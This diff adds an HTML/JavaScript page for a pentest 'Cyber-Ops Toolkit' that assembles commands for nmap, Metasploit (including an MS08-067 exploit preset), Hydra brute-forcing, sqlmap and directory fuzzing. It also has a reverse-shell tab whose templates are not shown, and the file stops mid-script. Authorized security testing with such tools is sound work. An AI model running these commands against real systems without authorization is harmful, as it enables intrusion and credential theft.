@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<title>CyberFriend | Cyber-Ops Toolkit</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Inter', sans-serif; background: #ffffff; color: #1e293b; line-height: 1.5; overflow-x: hidden; font-size: 14px; }
+  .video-background { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; overflow: hidden; }
+  .video-background video { min-width: 100%; min-height: 100%; width: auto; height: auto; position: absolute; top: 50%; left: 50%; opacity: 0.35; transform: translate(-50%, -50%); object-fit: cover; }
+  .video-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: -1; }
+  :root { --white: #ffffff; --offwhite: #f9fafb; --gray-50: #f8fafc; --gray-100: #f1f5f9; --gray-200: #e2e8f0; --gray-300: #cbd5e1; --gray-600: #475569; --gray-700: #334155; --gray-800: #1e293b; --gray-900: #0f172a; --green: #10b981; --green-dark: #059669; --blue: #3b82f6; --blue-dark: #2563eb; --grad: linear-gradient(135deg, #10b981, #3b82f6); --grad-hover: linear-gradient(135deg, #059669, #2563eb); --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05); --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03); --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.05), 0 4px 6px -2px rgba(0, 0, 0, 0.025); --border-light: 1px solid rgba(226, 232, 240, 0.5); }
+  h1, h2, h3, h4, h5, h6 { font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 700; letter-spacing: -0.02em; }
+  ::-webkit-scrollbar { width: 5px; }
+  ::-webkit-scrollbar-track { background: rgba(241, 245, 249, 0.5); }
+  ::-webkit-scrollbar-thumb { background: var(--green); border-radius: 10px; }
+  
+  .navbar { position: fixed; top: 0; left: 0; right: 0; z-index: 1000; padding: 0 5%; transition: all 0.3s ease; background: transparent; }
+  .navbar.scrolled { background: rgba(255, 255, 255, 0.96); backdrop-filter: blur(12px); border-bottom: var(--border-light); box-shadow: var(--shadow-sm); }
+  .nav-container { max-width: 1400px; margin: 0 auto; display: flex; align-items: center; justify-content: space-between; height: 64px; }
+  .logo { display: flex; align-items: center; gap: 12px; text-decoration: none; }
+  .nav-links { display: flex; list-style: none; gap: 1.8rem; align-items: center; }
+  .nav-links a { text-decoration: none; font-size: 0.85rem; font-weight: 500; color: var(--gray-700); transition: color 0.2s; }
+  .nav-links a:hover, .nav-links a.active { color: var(--green); }
+  .status-badge { background: rgba(16, 185, 129, 0.12); border: 1px solid rgba(16, 185, 129, 0.25); padding: 0.25rem 1rem; border-radius: 40px; font-size: 0.7rem; font-weight: 600; color: var(--green-dark); display: flex; align-items: center; gap: 6px; }
+  .status-dot { width: 7px; height: 7px; background: var(--green); border-radius: 50%; animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.2); } }
+  .menu-btn { display: none; background: none; border: none; cursor: pointer; padding: 8px; }
+  .menu-btn span { display: block; width: 22px; height: 2px; background: var(--gray-800); margin: 5px 0; border-radius: 2px; }
+  
+  .app-container { display: flex; padding-top: 64px; min-height: 100vh; }
+  
+  /* Sidebar */
+  .sidebar { width: 250px; background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(8px); border-right: var(--border-light); height: calc(100vh - 64px); position: sticky; top: 64px; overflow-y: auto; flex-shrink: 0; }
+  .sidebar::-webkit-scrollbar { width: 3px; }
+  .logo-area { padding: 1.5rem 1.2rem 1.2rem; border-bottom: var(--border-light); text-align: center; }
+  .logo-icon-large { width: 60px; height: 60px; margin: 0 auto 0.8rem; }
+  .logo-icon-large img { width: 100%; height: 100%; object-fit: contain; }
+  .logo-title-img { height: 28px; width: auto; object-fit: contain; margin-bottom: 0.4rem; }
+  .logo-badge { font-size: 0.6rem; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; color: var(--green); background: rgba(16, 185, 129, 0.1); padding: 0.15rem 0.7rem; border-radius: 20px; display: inline-block; }
+  .sidebar-nav { padding: 0.8rem 0; }
+  .nav-section-title { padding: 0.5rem 1.2rem; font-size: 0.65rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--gray-600); display: flex; align-items: center; gap: 6px; }
+  .nav-item { display: flex; align-items: center; gap: 10px; padding: 8px 1.2rem; margin: 2px 8px; border-radius: 8px; cursor: pointer; transition: all 0.2s ease; color: var(--gray-700); }
+  .nav-item i { width: 18px; font-size: 13px; color: var(--gray-500); }
+  .nav-item span { font-size: 0.8rem; font-weight: 500; }
+  .nav-item:hover { background: rgba(16, 185, 129, 0.08); color: var(--green); }
+  .nav-item:hover i { color: var(--green); }
+  .nav-item.active { background: var(--grad); color: white; }
+  .nav-item.active i { color: white; }
+  .sidebar-footer { padding: 0.8rem 1.2rem; border-top: var(--border-light); color: var(--gray-600); font-size: 0.65rem; text-align: center; }
+  
+  .main-content { flex: 1; overflow-y: auto; height: calc(100vh - 64px); }
+  .scroll-content { padding: 1.5rem; }
+  
+  /* Main Container */
+  .toolkit-container { max-width: 1200px; margin: 0 auto; }
+  
+  /* Cards */
+  .hero-card { background: rgba(255, 255, 255, 0.92); backdrop-filter: blur(8px); border-radius: 18px; padding: 1.5rem; margin-bottom: 1.5rem; border: var(--border-light); text-align: center; }
+  .warning-card { background: linear-gradient(135deg, rgba(245, 158, 11, 0.08), rgba(239, 68, 68, 0.05)); border: 1px solid rgba(245, 158, 11, 0.25); border-radius: 12px; padding: 0.75rem 1.2rem; margin-bottom: 1.5rem; display: flex; align-items: center; gap: 10px; }
+  .warning-card i { color: #f59e0b; font-size: 16px; }
+  .warning-card span { font-size: 12px; color: #b45309; }
+  
+  /* Tool Tabs */
+  .tool-tabs { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 1.5rem; }
+  .tool-tab { background: rgba(255, 255, 255, 0.85); border: var(--border-light); border-radius: 40px; padding: 6px 14px; font-size: 12px; font-weight: 500; cursor: pointer; transition: all 0.2s; white-space: nowrap; }
+  .tool-tab:hover { background: white; border-color: var(--green); color: var(--green); }
+  .tool-tab.active { background: var(--grad); color: white; border-color: transparent; }
+  
+  /* Panels */
+  .panel { background: rgba(255, 255, 255, 0.92); backdrop-filter: blur(8px); border-radius: 18px; padding: 1.25rem; margin-bottom: 1.5rem; border: var(--border-light); }
+  .field { margin-bottom: 14px; }
+  .field label { display: block; font-size: 11px; font-weight: 600; color: var(--gray-600); margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.4px; }
+  .field input, .field select, .field textarea { width: 100%; padding: 8px 12px; border-radius: 10px; border: 1px solid var(--gray-200); background: white; font-family: 'Inter', monospace; font-size: 12px; transition: all 0.2s; }
+  .field input:focus, .field select:focus { outline: none; border-color: var(--green); box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.1); }
+  .input-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  
+  .cmd-output { background: var(--gray-50); border-radius: 10px; padding: 10px 12px; font-family: 'Courier New', monospace; font-size: 11px; color: var(--gray-800); white-space: pre-wrap; word-break: break-all; border: 1px solid var(--gray-200); min-height: 55px; }
+  
+  .actions { display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap; }
+  .btn { padding: 6px 14px; border-radius: 40px; font-size: 11px; font-weight: 600; cursor: pointer; transition: all 0.2s; border: none; font-family: 'Inter', sans-serif; display: inline-flex; align-items: center; gap: 6px; }
+  .btn-primary { background: var(--grad); color: white; }
+  .btn-primary:hover { transform: scale(0.97); background: var(--grad-hover); }
+  .btn-secondary { background: white; border: 1px solid var(--gray-200); color: var(--gray-700); }
+  .btn-secondary:hover { border-color: var(--green); color: var(--green); background: rgba(16, 185, 129, 0.05); }
+  
+  /* Fixed Switch Grid */
+  .switch-grid { display: flex; flex-direction: column; gap: 8px; background: var(--gray-50); border-radius: 10px; padding: 10px; border: 1px solid var(--gray-200); }
+  .switch-item { display: flex; align-items: center; gap: 10px; padding: 6px 8px; border-radius: 8px; cursor: pointer; transition: all 0.2s; }
+  .switch-item:hover { background: rgba(16, 185, 129, 0.05); }
+  .switch-item input { width: 16px; height: 16px; cursor: pointer; accent-color: var(--green); }
+  .switch-item label { font-size: 12px; font-weight: normal; text-transform: none; color: var(--gray-700); margin: 0; cursor: pointer; flex: 1; }
+  .switch-item .flag-desc { font-size: 10px; color: var(--gray-500); margin-left: 26px; }
+  
+  .template-list { max-height: 180px; overflow-y: auto; border: 1px solid var(--gray-200); border-radius: 10px; padding: 6px; }
+  .template-item { padding: 6px 10px; cursor: pointer; border-radius: 6px; font-size: 11px; transition: all 0.2s; }
+  .template-item:hover { background: rgba(16, 185, 129, 0.08); color: var(--green); }
+  
+  .tool-section { display: none; }
+  .tool-section.active { display: block; }
+  
+  .footer-note { margin-top: 1.5rem; padding-top: 1rem; border-top: var(--border-light); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 0.8rem; color: var(--gray-600); font-size: 0.7rem; }
+  
+  .toast { position: fixed; bottom: 20px; right: 20px; background: var(--green-dark); color: white; padding: 8px 16px; border-radius: 40px; font-size: 12px; font-weight: 500; z-index: 9999; animation: slideIn 0.3s ease; }
+  @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+  
+  @media (max-width: 900px) {
+    .sidebar { display: none; }
+    .menu-btn { display: block; }
+    .nav-links { display: none; position: fixed; top: 64px; left: 0; right: 0; background: white; flex-direction: column; padding: 1.5rem; gap: 1rem; box-shadow: var(--shadow-lg); z-index: 999; }
+    .nav-links.open { display: flex; }
+    .input-row { grid-template-columns: 1fr; gap: 10px; }
+    .tool-tabs { overflow-x: auto; flex-wrap: nowrap; padding-bottom: 6px; }
+    .scroll-content { padding: 1rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="video-background"><video autoplay muted loop playsinline id="bgVideo"><source src="background.mp4" type="video/mp4"></video></div>
+<div class="video-overlay"></div>
+
+<nav class="navbar" id="navbar">
+  <div class="nav-container">
+    <a href="#" class="logo"></a>
+    <button class="menu-btn" id="menuBtn"><span></span><span></span><span></span></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="#">Tools</a></li>
+      <li><a href="#">Scanner</a></li>
+      <li><a href="#" class="active">Toolkit</a></li>
+      <li><a href="#">Reports</a></li>
+      <li><span class="status-badge"><span class="status-dot"></span> Cyber-Ops</span></li>
+    </ul>
+  </div>
+</nav>
+
+<div class="app-container">
+  <aside class="sidebar">
+    <div class="logo-area">
+      <div class="logo-icon-large"><img src="solo_logo.jpeg" alt="CyberFriend" onerror="this.style.display='none';"></div>
+      <img src="company_text.jpeg" alt="CyberFriend" class="logo-title-img" onerror="this.style.display='none';">
+      <div class="logo-badge">OPS TOOLKIT</div>
+    </div>
+    <div class="sidebar-nav">
+      <div class="nav-section-title"><i class="fas fa-cube"></i> TOOLS</div>
+      <div class="nav-item" data-tool="builder"><i class="fas fa-terminal"></i><span>Builder</span></div>
+      <div class="nav-item" data-tool="msf"><i class="fas fa-shield-virus"></i><span>Metasploit</span></div>
+      <div class="nav-item" data-tool="hydra"><i class="fas fa-bolt"></i><span>Hydra</span></div>
+      <div class="nav-item" data-tool="gobuster"><i class="fas fa-folder-open"></i><span>Gobuster</span></div>
+      <div class="nav-item" data-tool="ffuf"><i class="fas fa-search"></i><span>FFUF</span></div>
+      <div class="nav-item" data-tool="sqlmap"><i class="fas fa-database"></i><span>SQLMap</span></div>
+      <div class="nav-item" data-tool="find"><i class="fas fa-file-search"></i><span>Find</span></div>
+      <div class="nav-item" data-tool="rshell"><i class="fas fa-network-wired"></i><span>Reverse Shells</span></div>
+    </div>
+    <div class="sidebar-footer"><i class="fas fa-shield-alt"></i> UI only · no execution</div>
+  </aside>
+
+  <main class="main-content">
+    <div class="scroll-content">
+      <div class="toolkit-container">
+        <div class="hero-card">
+          <div style="display: flex; align-items: center; justify-content: center; gap: 14px; flex-wrap: wrap;">
+            <div style="width: 48px; height: 48px; background: var(--grad); border-radius: 14px; display: flex; align-items: center; justify-content: center;"><i class="fas fa-tools" style="font-size: 22px; color: white;"></i></div>
+            <div><h3 style="margin:0; font-size: 1.3rem;">Cyber-Ops Toolkit</h3><p style="color: var(--gray-600); margin-top: 2px; font-size: 12px;">Command builders for penetration testing utilities</p></div>
+          </div>
+        </div>
+
+        <div class="warning-card"><i class="fas fa-exclamation-triangle"></i><span>FOR AUTHORIZED TESTING ONLY — Use these commands only on systems you own or have explicit permission to test.</span></div>
+
+        <!-- Tool Tabs -->
+        <div class="tool-tabs">
+          <div class="tool-tab active" data-tab="builder">Builder</div>
+          <div class="tool-tab" data-tab="msf">Metasploit</div>
+          <div class="tool-tab" data-tab="hydra">Hydra</div>
+          <div class="tool-tab" data-tab="gobuster">Gobuster</div>
+          <div class="tool-tab" data-tab="ffuf">FFUF</div>
+          <div class="tool-tab" data-tab="sqlmap">SQLMap</div>
+          <div class="tool-tab" data-tab="find">Find</div>
+          <div class="tool-tab" data-tab="rshell">Reverse Shells</div>
+        </div>
+
+        <!-- Builder Section -->
+        <div id="builder-section" class="tool-section active">
+          <div class="panel">
+            <div class="field">
+              <label><i class="fas fa-toolbox"></i> Tool</label>
+              <select id="tool">
+                <option value="nmap">nmap - Network Scanner</option>
+                <option value="masscan">masscan - Fast Port Scanner</option>
+                <option value="ftp">ftp - File Transfer</option>
+                <option value="smbclient">smbclient - SMB Client</option>
+                <option value="telnet">telnet - Remote Connection</option>
+              </select>
+            </div>
+            <div class="field">
+              <label><i class="fas fa-crosshairs"></i> Target IP / Host</label>
+              <input id="ip" placeholder="e.g., 10.10.10.10 or example.com">
+            </div>
+            <div class="field">
+              <label><i class="fas fa-plug"></i> Port (optional)</label>
+              <input id="port" placeholder="e.g., 80, 22, or 1-65535">
+            </div>
+            <div class="field">
+              <label><i class="fas fa-flag-checkered"></i> Flags / Switches</label>
+              <div id="switches" class="switch-grid">
+                <!-- Switches will be loaded dynamically -->
+              </div>
+            </div>
+            <div>
+              <label><i class="fas fa-terminal"></i> Generated Command</label>
+              <div id="output" class="cmd-output">—</div>
+              <div class="actions">
+                <button id="copyCmd" class="btn btn-primary"><i class="fas fa-copy"></i> Copy Command</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Metasploit Section -->
+        <div id="msf-section" class="tool-section">
+          <div class="panel">
+            <div class="field"><label>Preset</label><select id="msf-preset"></select></div>
+            <div class="field"><label>Module</label><input id="msf-module" placeholder="exploit/module/name"></div>
+            <div class="input-row"><div class="field"><label>RHOSTS</label><input id="msf-rhosts" value="RHOSTS"></div><div class="field"><label>RPORT</label><input id="msf-rport" value="21"></div></div>
+            <div class="input-row"><div class="field"><label>LHOST</label><input id="msf-lhost" value="LHOST"></div><div class="field"><label>LPORT</label><input id="msf-lport" value="LPORT"></div></div>
+            <div class="input-row"><div class="field"><label>Username</label><input id="msf-user"></div><div class="field"><label>Password</label><input id="msf-pass"></div></div>
+            <div class="field"><label>Action</label><input id="msf-action" value="run"></div>
+            <div><label>MSF Command</label><div id="msf-output" class="cmd-output">—</div><div class="actions"><button id="msf-copy" class="btn btn-primary"><i class="fas fa-copy"></i> Copy</button></div></div>
+          </div>
+        </div>
+
+        <!-- Hydra Section -->
+        <div id="hydra-section" class="tool-section">
+          <div class="panel">
+            <div class="field"><label>Protocol</label><input id="hydra-protocol" placeholder="ssh / ftp / http-post-form"></div>
+            <div class="input-row"><div class="field"><label>Target</label><input id="hydra-ip"></div><div class="field"><label>Port</label><input id="hydra-port"></div></div>
+            <div class="input-row"><div class="field"><label>User / Userlist</label><input id="hydra-user" placeholder="admin or /path/to/users.txt"></div><div class="field"><label>Pass / Passlist</label><input id="hydra-pass" placeholder="password or /path/to/pass.txt"></div></div>
+            <div class="field"><label>Options</label><input id="hydra-options" placeholder="-V -t 4"></div>
+            <div><label>Hydra Command</label><div id="hydra-output" class="cmd-output">—</div><div class="actions"><button id="hydra-copy" class="btn btn-primary"><i class="fas fa-copy"></i> Copy</button></div></div>
+          </div>
+        </div>
+
+        <!-- Gobuster Section -->
+        <div id="gobuster-section" class="tool-section">
+          <div class="panel">
+            <div class="input-row"><div class="field"><label>Mode</label><select id="gobuster-mode"><option value="dir">dir</option><option value="vhost">vhost</option><option value="dns">dns</option></select></div><div class="field"><label>Target</label><input id="gobuster-target" placeholder="https://example.com"></div></div>
+            <div class="field"><label>Wordlist</label><input id="gobuster-wordlist" placeholder="/usr/share/wordlists/dirb/common.txt"></div>
+            <div class="field"><label>Options</label><input id="gobuster-options" placeholder="-t 50 -x php,txt"></div>
+            <div><label>Gobuster Command</label><div id="gobuster-output" class="cmd-output">—</div><div class="actions"><button id="gobuster-copy" class="btn btn-primary"><i class="fas fa-copy"></i> Copy</button></div></div>
+          </div>
+        </div>
+
+        <!-- FFUF Section -->
+        <div id="ffuf-section" class="tool-section">
+          <div class="panel">
+            <div class="field"><label>URL (use FUZZ)</label><input id="ffuf-url" placeholder="http://example.com/FUZZ"></div>
+            <div class="field"><label>Wordlist</label><input id="ffuf-wordlist" placeholder="/path/to/wordlist.txt"></div>
+            <div class="field"><label>Options</label><input id="ffuf-options" placeholder="-mc 200 -c -t 50"></div>
+            <div><label>FFUF Command</label><div id="ffuf-output" class="cmd-output">—</div><div class="actions"><button id="ffuf-copy" class="btn btn-primary"><i class="fas fa-copy"></i> Copy</button></div></div>
+          </div>
+        </div>
+
+        <!-- SQLMap Section -->
+        <div id="sqlmap-section" class="tool-section">
+          <div class="panel">
+            <div class="field"><label>Target URL</label><input id="sqlmap-url" placeholder="http://target.com/page?id=1"></div>
+            <div class="field"><label>POST Data</label><input id="sqlmap-data" placeholder="param1=value1"></div>
+            <div class="field"><label>Cookies</label><input id="sqlmap-cookies" placeholder="PHPSESSID=abc123"></div>
+            <div class="field"><label>Options</label><input id="sqlmap-options" placeholder="--dbs --level=3"></div>
+            <div><label>SQLMap Command</label><div id="sqlmap-output" class="cmd-output">—</div><div class="actions"><button id="sqlmap-copy" class="btn btn-primary"><i class="fas fa-copy"></i> Copy</button></div></div>
+          </div>
+        </div>
+
+        <!-- Find Section -->
+        <div id="find-section" class="tool-section">
+          <div class="panel">
+            <div class="input-row"><div class="field"><label>OS</label><select id="find-os"><option value="linux">Linux</option><option value="windows">Windows</option></select></div><div class="field"><label>Search Type</label><select id="find-type"><option value="all">All Files</option><option value="ext">By Extension</option><option value="exact">Exact Name</option><option value="size">By Size</option><option value="perm">Permissions</option></select></div></div>
+            <div class="field"><label>Value</label><input id="find-name" placeholder="txt or secret.txt or +10M"></div>
+            <div class="field"><label>Extra Options</label><input id="find-options" placeholder="-iname '*.log' 2>/dev/null"></div>
+            <div><label>Find Command</label><div id="find-output" class="cmd-output">—</div><div class="actions"><button id="find-copy" class="btn btn-primary"><i class="fas fa-copy"></i> Copy</button></div></div>
+          </div>
+        </div>
+
+        <!-- Reverse Shells Section -->
+        <div id="rshell-section" class="tool-section">
+          <div class="panel">
+            <div class="input-row"><div class="field"><label>LHOST (Your IP)</label><input id="rs-ip" placeholder="10.10.10.10"></div><div class="field"><label>LPORT (Your Port)</label><input id="rs-port" placeholder="4444"></div></div>
+            <div class="field"><label>Search Templates</label><input id="rs-search" placeholder="Filter..."></div>
+            <div class="input-row">
+              <div><label>Templates</label><div id="rs-list" class="template-list" style="min-height:140px"></div></div>
+              <div><label>Generated Payload</label><div id="rs-payload" class="cmd-output" style="min-height:100px">—</div><div class="actions"><button id="rs-copy" class="btn btn-primary"><i class="fas fa-copy"></i> Copy</button></div></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="footer-note"><span><i class="fas fa-shield-alt"></i> CyberFriend — Cyber-Ops Toolkit (UI-only, commands not executed)</span><span><i class="fas fa-clock"></i> <span id="liveTime"></span></span></div>
+      </div>
+    </div>
+  </main>
+</div>
+
+<script>
+function toast(msg){ const t=document.createElement('div'); t.className='toast'; t.innerHTML=`<i class="fas fa-check-circle"></i> ${msg}`; document.body.appendChild(t); setTimeout(()=>t.remove(),1800); }
+function safeCopy(text,msg){ navigator.clipboard?.writeText(text).then(()=>toast(msg||'Copied!')).catch(()=>alert('Copy failed')); }
+
+// Tab switching
+document.querySelectorAll('.nav-item, .tool-tab').forEach(el=>{
+  el.addEventListener('click',()=>{
+    const tool = el.getAttribute('data-tool') || el.getAttribute('data-tab');
+    document.querySelectorAll('.tool-section').forEach(sec=>sec.classList.remove('active'));
+    document.getElementById(`${tool}-section`).classList.add('active');
+    document.querySelectorAll('.nav-item, .tool-tab').forEach(n=>n.classList.remove('active'));
+    document.querySelectorAll(`[data-tool="${tool}"], [data-tab="${tool}"]`).forEach(n=>n.classList.add('active'));
+  });
+});
+
+// ========== BUILDER WITH FIXED SWITCHES ==========
+const toolConfigs = {
+  nmap: { name: 'nmap', switches: ['-sS (TCP SYN scan)', '-sV (Service version detection)', '-A (OS detection + traceroute)', '-O (OS fingerprinting)', '-p- (All ports)', '-sC (Default scripts)', '--script vuln (Vulnerability scanning)'] },
+  masscan: { name: 'masscan', switches: ['--rate 1000 (Packets per second)', '--banners (Grab banners)', '--exclude 255.255.255.255', '--wait 0 (No wait)'] },
+  ftp: { name: 'ftp', switches: [] },
+  smbclient: { name: 'smbclient', switches: [] },
+  telnet: { name: 'telnet', switches: [] }
+};
+
+function renderSwitches() {
+  const tool = document.getElementById('tool').value;
+  const config = toolConfigs[tool];
+  const switchesDiv = document.getElementById('switches');
+  
+  if (!config || !config.switches || config.switches.length === 0) {
+    switchesDiv.innerHTML = '<div style="padding: 10px; text-align: center; color: var(--gray-500);">No flags available for this tool</div>';
+    return;
+  }
+  
+  switchesDiv.innerHTML = '';
+  config.switches.forEach((switchText, index) => {
+    const flagPart = switchText.split(' ')[0];
+    const descPart = switchText.substring(switchText.indexOf(' ') + 1);
+    const switchId = `switch_${tool}_${index}`;
+    const div = document.createElement('div');
+    div.className = 'switch-item';
+    div.innerHTML = `
+      <input type="checkbox" id="${switchId}" data-flag="${flagPart}">
+      <label for="${switchId}"><strong>${flagPart}</strong> — ${descPart}</label>
+    `;
+    switchesDiv.appendChild(div);
+  });
+}
+
+function buildCommand() {
+  const tool = document.getElementById('tool').value;
+  const target = document.getElementById('ip').value.trim();
+  const port = document.getElementById('port').value.trim();
+  const switchesDiv = document.getElementById('switches');
+  
+  if (!target) {
+    document.getElementById('output').textContent = '← Enter target IP/host';
+    return;
+  }
+  
+  const selectedFlags = Array.from(switchesDiv.querySelectorAll('input:checked')).map(ch => ch.getAttribute('data-flag'));
+  let cmd = '';
+  
+  if (tool === 'nmap') {
+    cmd = `nmap ${selectedFlags.join(' ')} ${port ? '-p ' + port : ''} ${target}`.replace(/\s+/g, ' ').trim();
+  } else if (tool === 'masscan') {
+    cmd = `masscan ${target} ${port ? '-p' + port : ''} ${selectedFlags.join(' ')}`.replace(/\s+/g, ' ').trim();
+  } else if (tool === 'ftp') {
+    cmd = `ftp ${target} ${port || ''}`.trim();
+  } else if (tool === 'smbclient') {
+    cmd = `smbclient //${target}/share ${port ? '-p ' + port : ''} -U <user>`.trim();
+  } else if (tool === 'telnet') {
+    cmd = `telnet ${target} ${port || 23}`.trim();
+  }
+  
+  document.getElementById('output').textContent = cmd || '—';
+}
+
+// Initialize builder
+renderSwitches();
+buildCommand();
+
+document.getElementById('tool').addEventListener('change', () => { renderSwitches(); buildCommand(); });
+document.getElementById('ip').addEventListener('input', buildCommand);
+document.getElementById('port').addEventListener('input', buildCommand);
+document.getElementById('switches').addEventListener('change', buildCommand);
+document.getElementById('copyCmd').addEventListener('click', () => {
+  const cmd = document.getElementById('output').textContent;
+  if (cmd && !cmd.startsWith('←')) safeCopy(cmd, 'Command copied!');
+});
+
+// ========== METASPLOIT ==========
+const msfPresets = [
+  { key: 'ftp_login', label: 'FTP Login Scanner', module: 'auxiliary/scanner/ftp/ftp_login', rport: 21 },
+  { key: 'ssh_login', label: 'SSH Login Scanner', module: 'auxiliary/scanner/ssh/ssh_login', rport: 22 },
+  { key: 'smb_ms08_067', label: 'SMB MS08-067', module: 'exploit/windows/smb/ms08_067_netapi', rport: 445 }
+];
+const presetSel = document.getElementById('msf-preset');
+msfPresets.forEach(p => { const o = document.createElement('option'); o.value = p.key; o.textContent = p.label; presetSel.appendChild(o); });
+function applyPreset(key) { const p = msfPresets.find(x => x.key === key); if (p) { document.getElementById('msf-module').value = p.module; document.getElementById('msf-rport').value = p.rport; buildMsf(); } }
+presetSel.addEventListener('change', () => applyPreset(presetSel.value));
+function buildMsf() {
+  const mod = document.getElementById('msf-module').value.trim() || 'exploit/...';
+  const rh = document.getElementById('msf-rhosts').value.trim() || 'RHOSTS';
+  const rp = document.getElementById('msf-rport').value.trim() || 'RPORT';
+  const lh = document.getElementById('msf-lhost').value.trim() || 'LHOST';
+  const lp = document.getElementById('msf-lport').value.trim() || 'LPORT';
+  const un = document.getElementById('msf-user').value.trim();
+  const pw = document.getElementById('msf-pass').value.trim();
+  const act = document.getElementById('msf-action').value.trim() || 'run';
+  let cmd = `msfconsole -q -x "use ${mod}; set RHOSTS ${rh}; set RPORT ${rp}; set LHOST ${lh}; set LPORT ${lp}; `;
+  if (un) cmd += `set USERNAME ${un}; `;
+  if (pw) cmd += `set PASSWORD ${pw}; `;
+  cmd += `${act}"`;
+  document.getElementById('msf-output').textContent = cmd;
+}
+['msf-module', 'msf-rhosts', 'msf-rport', 'msf-lhost', 'msf-lport', 'msf-user', 'msf-pass', 'msf-action'].forEach(id => document.getElementById(id)?.addEventListener('input', buildMsf));
+document.getElementById('msf-copy')?.addEventListener('click', () => safeCopy(document.getElementById('msf-output').textContent, 'MSF copied!'));
+applyPreset(msfPresets[0].key);
+
+// ========== HYDRA ==========
+function buildHydra() {
+  const proto = document.getElementById('hydra-protocol').value.trim();
+  const ip = document.getElementById('hydra-ip').value.trim();
+  const port = document.getElementById('hydra-port').value.trim();
+  let user = document.getElementById('hydra-user').value.trim();
+  let pass = document.getElementById('hydra-pass').value.trim();
+  let opts = document.getElementById('hydra-options').value.trim();
+  if (!proto || !ip || (!user && !pass)) { document.getElementById('hydra-output').textContent = '⚠️ Fill protocol, target, and credentials'; return; }
+  const userPart = user.startsWith('-L') || user.startsWith('-l') ? user : (user.includes('/') ? `-L ${user}` : `-l ${user}`);
+  const passPart = pass.startsWith('-P') || pass.startsWith('-p') ? pass : (pass.includes('/') ? `-P ${pass}` : `-p ${pass}`);
+  const portPart = port ? `-s ${port}` : '';
+  const cmd = `hydra ${userPart} ${passPart} ${portPart} ${opts} ${ip} ${proto}`.replace(/\s+/g, ' ').trim();
+  document.getElementById('hydra-output').textContent = cmd;
+}
+['hydra-protocol', 'hydra-ip', 'hydra-port', 'hydra-user', 'hydra-pass', 'hydra-options'].forEach(id => document.getElementById(id)?.addEventListener('input', buildHydra));
+document.getElementById('hydra-copy')?.addEventListener('click', () => safeCopy(document.getElementById('hydra-output').textContent, 'Hydra copied!'));
+buildHydra();
+
+// ========== GOBUSTER ==========
+function buildGobuster() {
+  const mode = document.getElementById('gobuster-mode').value;
+  const target = document.getElementById('gobuster-target').value.trim();
+  const wl = document.getElementById('gobuster-wordlist').value.trim();
+  const opts = document.getElementById('gobuster-options').value.trim();
+  if (!target || !wl) { document.getElementById('gobuster-output').textContent = '⚠️ Enter target and wordlist'; return; }
+  let base = `gobuster ${mode}`;
+  if (mode === 'dir' || mode === 'vhost') base += ` -u ${target} -w ${wl}`;
+  else if (mode === 'dns') base += ` -d ${target} -w ${wl}`;
+  document.getElementById('gobuster-output').textContent = (base + ' ' + opts).trim();
+}
+['gobuster-mode', 'gobuster-target', 'gobuster-wordlist', 'gobuster-options'].forEach(id => document.getElementById(id)?.addEventListener('input', buildGobuster));
+document.getElementById('gobuster-copy')?.addEventListener('click', () => safeCopy(document.getElementById('gobuster-output').textContent, 'Gobuster copied!'));
+buildGobuster();
+
+// ========== FFUF ==========
+function buildFfuf() {
+  const url = document.getElementById('ffuf-url').value.trim();
+  const w = document.getElementById('ffuf-wordlist').value.trim();
+  const o = document.getElementById('ffuf-options').value.trim();
+  if (!url || !w) { document.getElementById('ffuf-output').textContent = '⚠️ Enter URL (with FUZZ) and wordlist'; return; }
+  document.getElementById('ffuf-output').textContent = `ffuf -u ${url} -w ${w} ${o}`.trim();
+}
+['ffuf-url', 'ffuf-wordlist', 'ffuf-options'].forEach(id => document.getElementById(id)?.addEventListener('input', buildFfuf));
+document.getElementById('ffuf-copy')?.addEventListener('click', () => safeCopy(document.getElementById('ffuf-output').textContent, 'FFUF copied!'));
+buildFfuf();
+
+// ========== SQLMAP ==========
+function buildSqlmap() {
+  const url = document.getElementById('sqlmap-url').value.trim();
+  const data = document.getElementById('sqlmap-data').value.trim();
+  const cookies = document.getElementById('sqlmap-cookies').value.trim();
+  const opts = document.getElementById('sqlmap-options').value.trim();
+  if (!url) { document.getElementById('sqlmap-output').textContent = '⚠️ Enter target URL'; return; }
+  let cmd = `sqlmap -u "${url}"`;
+  if (data) cmd += ` --data="${data}"`;
+  if (cookies) cmd += ` --cookie="${cookies}"`;
+  if (opts) cmd += ` ${opts}`;
+  document.getElementById('sqlmap-output').textContent = cmd.trim();
+}
